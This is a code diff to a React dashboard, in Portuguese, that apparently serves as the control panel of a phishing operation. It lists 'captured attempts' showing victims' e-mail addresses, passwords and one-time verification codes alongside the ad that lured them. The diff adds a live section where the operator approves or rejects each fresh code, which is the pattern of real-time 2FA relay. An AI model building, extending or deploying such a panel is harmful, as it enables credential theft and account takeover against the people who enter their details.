@@ -5,7 +5,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/contexts/AuthContext";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity } from "lucide-react";
+import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity, History, Radio } from "lucide-react";
 import { toast } from "sonner";
 import { ADMIN_BASE } from "@/lib/admin-route";
 
@@ -228,18 +228,21 @@ export default function Dashboard() {
   const approvedCount = attempts.filter((a) => a.status === "approve").length;
   const rejectedCount = attempts.filter((a) => a.status === "reject").length;
 
-  // Primeira pendente por sessão = a única acionável
+  // Última tentativa pendente por sessão = a única acionável (a "ao vivo").
+  // As anteriores da mesma sessão viram "ignorado" e descem pro histórico.
   const actionableKeys = useMemo(() => {
-    const seen = new Set<string>();
-    const keys = new Set<string>();
-    for (const a of [...attempts].reverse()) {
+    const latestPerSession = new Map<string, AttemptRow>();
+    for (const a of attempts) {
       if (a.status !== "pending") continue;
-      if (seen.has(a.session_id)) continue;
-      seen.add(a.session_id);
-      keys.add(a.key);
+      const cur = latestPerSession.get(a.session_id);
+      if (!cur || a.codeAt > cur.codeAt) latestPerSession.set(a.session_id, a);
     }
-    return keys;
+    return new Set(Array.from(latestPerSession.values()).map((a) => a.key));
   }, [attempts]);
+
+  // Separa em "ao vivo" (acionáveis) e "histórico" (resto)
+  const live = attempts.filter((a) => actionableKeys.has(a.key));
+  const history = attempts.filter((a) => !actionableKeys.has(a.key));
 
   const send = async (row: AttemptRow, action: "approve" | "reject") => {
     setBusy(`${row.key}-${action}`);
@@ -291,22 +294,55 @@ export default function Dashboard() {
       <main className="mx-auto max-w-7xl px-6 py-8">
         {/* Cards de resumo */}
         <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
-          <StatCard label="Pendentes" value={pendingCount} icon={<Sparkles className="h-4 w-4" />} highlight={pendingCount > 0} />
+          <StatCard label="Ao vivo" value={live.length} icon={<Radio className="h-4 w-4" />} highlight={live.length > 0} />
           <StatCard label="Aprovados" value={approvedCount} icon={<Check className="h-4 w-4" />} />
           <StatCard label="Rejeitados" value={rejectedCount} icon={<X className="h-4 w-4" />} />
           <StatCard label="Total" value={attempts.length} icon={<Activity className="h-4 w-4" />} />
         </div>
 
-        {/* Tabela de leads */}
-        <section className="mt-8 rounded-xl border border-border bg-card shadow-card">
+        {/* AO VIVO */}
+        <section className="mt-8 rounded-xl border border-primary/30 bg-card shadow-glow">
           <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
             <div className="flex items-center gap-2">
-              <h2 className="text-base font-semibold">Tentativas capturadas</h2>
-              <Badge variant="secondary" className="text-[10px]">
-                {attempts.length}
-              </Badge>
+              <span className="relative flex h-2.5 w-2.5">
+                <span className={`absolute inline-flex h-full w-full rounded-full bg-success ${live.length > 0 ? "animate-ping opacity-75" : "opacity-0"}`} />
+                <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-success" />
+              </span>
+              <h2 className="text-base font-semibold">Ao vivo</h2>
+              <Badge variant="secondary" className="text-[10px]">{live.length}</Badge>
             </div>
-            {attempts.length > 0 && (
+          </div>
+
+          {live.length === 0 ? (
+            <div className="flex flex-col items-center gap-3 px-6 py-12 text-center">
+              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-muted">
+                <Radio className="h-5 w-5 text-muted-foreground" />
+              </div>
+              <p className="text-sm text-muted-foreground">
+                Aguardando códigos… as tentativas em tempo real vão aparecer aqui pra você aprovar ou rejeitar.
+              </p>
+            </div>
+          ) : (
+            <AttemptsTable
+              rows={live}
+              leads={leads}
+              adTitles={adTitles}
+              actionable
+              busy={busy}
+              onAction={send}
+            />
+          )}
+        </section>
+
+        {/* HISTÓRICO */}
+        <section className="mt-6 rounded-xl border border-border bg-card shadow-card">
+          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
+            <div className="flex items-center gap-2">
+              <History className="h-4 w-4 text-muted-foreground" />
+              <h2 className="text-base font-semibold">Histórico</h2>
+              <Badge variant="secondary" className="text-[10px]">{history.length}</Badge>
+            </div>
+            {history.length > 0 && (
               <Button
                 size="sm"
                 variant="ghost"
@@ -314,143 +350,29 @@ export default function Dashboard() {
                 className="h-8 text-xs text-muted-foreground hover:text-destructive"
               >
                 <Trash2 className="mr-1 h-3 w-3" />
-                Limpar histórico
+                Limpar tudo
               </Button>
             )}
           </div>
 
-          {attempts.length === 0 ? (
-            <div className="flex flex-col items-center gap-3 px-6 py-16 text-center">
+          {history.length === 0 ? (
+            <div className="flex flex-col items-center gap-3 px-6 py-12 text-center">
               <div className="flex h-12 w-12 items-center justify-center rounded-full bg-muted">
-                <Activity className="h-5 w-5 text-muted-foreground" />
+                <History className="h-5 w-5 text-muted-foreground" />
               </div>
               <p className="text-sm text-muted-foreground">
-                Aguardando capturas… cada vez que alguém digitar um código, vai aparecer aqui.
+                Quando você aprovar, rejeitar ou um novo código chegar, as tentativas antigas aparecem aqui.
               </p>
             </div>
           ) : (
-            <div className="overflow-x-auto">
-              <table className="w-full text-sm">
-                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
-                  <tr>
-                    <th className="px-4 py-3 text-left font-medium">Hora</th>
-                    <th className="px-4 py-3 text-left font-medium">Anúncio</th>
-                    <th className="px-4 py-3 text-left font-medium">
-                      <span className="inline-flex items-center gap-1">
-                        <Mail className="h-3 w-3" /> E-mail
-                      </span>
-                    </th>
-                    <th className="px-4 py-3 text-left font-medium">
-                      <span className="inline-flex items-center gap-1">
-                        <KeyRound className="h-3 w-3" /> Senha
-                      </span>
-                    </th>
-                    <th className="px-4 py-3 text-left font-medium">
-                      <span className="inline-flex items-center gap-1">
-                        <Hash className="h-3 w-3" /> Código
-                      </span>
-                    </th>
-                    <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
-                    <th className="px-4 py-3 text-left font-medium">Status</th>
-                    <th className="px-4 py-3 text-right font-medium">Ações</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {attempts.map((row) => {
-                    const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
-                    const isActionable = actionableKeys.has(row.key);
-                    const ad = adTitles[row.ad_id];
-                    return (
-                      <tr
-                        key={row.key}
-                        className={`border-t border-border transition-colors ${
-                          isActionable ? "bg-primary/5" : "hover:bg-muted/30"
-                        }`}
-                      >
-                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
-                          {formatTime(row.codeAt)}
-                        </td>
-                        <td className="px-4 py-3 text-xs">
-                          {ad ? (
-                            <div className="flex flex-col">
-                              <span className="truncate font-medium">{ad.title}</span>
-                              <span className="truncate font-mono text-[10px] text-muted-foreground">
-                                /{ad.slug}
-                              </span>
-                            </div>
-                          ) : (
-                            <span className="text-muted-foreground">—</span>
-                          )}
-                        </td>
-                        <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
-                        <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
-                        <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
-                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
-                          {deviceLabel(ua)}
-                        </td>
-                        <td className="whitespace-nowrap px-4 py-3 text-xs">
-                          {row.status === "approve" && (
-                            <span className="inline-flex items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-success">
-                              <Check className="h-3 w-3" /> aprovado
-                            </span>
-                          )}
-                          {row.status === "reject" && (
-                            <span className="inline-flex items-center gap-1 rounded-full bg-destructive/15 px-2 py-0.5 text-destructive">
-                              <X className="h-3 w-3" /> rejeitado
-                            </span>
-                          )}
-                          {row.status === "pending" && isActionable && (
-                            <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                              ⏳ aguardando
-                            </span>
-                          )}
-                          {row.status === "pending" && !isActionable && (
-                            <span className="text-muted-foreground">— ignorado</span>
-                          )}
-                        </td>
-                        <td className="px-4 py-3 text-right">
-                          {isActionable ? (
-                            <div className="flex justify-end gap-1.5">
-                              <Button
-                                size="sm"
-                                className="h-8 bg-success px-3 text-success-foreground hover:bg-success/90"
-                                onClick={() => send(row, "approve")}
-                                disabled={busy === `${row.key}-approve`}
-                              >
-                                {busy === `${row.key}-approve` ? (
-                                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
-                                ) : (
-                                  <>
-                                    <Check className="mr-1 h-3.5 w-3.5" /> Aprovar
-                                  </>
-                                )}
-                              </Button>
-                              <Button
-                                size="sm"
-                                variant="outline"
-                                className="h-8 border-destructive/40 px-3 text-destructive hover:bg-destructive/10"
-                                onClick={() => send(row, "reject")}
-                                disabled={busy === `${row.key}-reject`}
-                              >
-                                {busy === `${row.key}-reject` ? (
-                                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
-                                ) : (
-                                  <>
-                                    <X className="mr-1 h-3.5 w-3.5" /> Rejeitar
-                                  </>
-                                )}
-                              </Button>
-                            </div>
-                          ) : (
-                            <span className="text-xs text-muted-foreground">—</span>
-                          )}
-                        </td>
-                      </tr>
-                    );
-                  })}
-                </tbody>
-              </table>
-            </div>
+            <AttemptsTable
+              rows={history}
+              leads={leads}
+              adTitles={adTitles}
+              actionable={false}
+              busy={busy}
+              onAction={send}
+            />
           )}
         </section>
       </main>
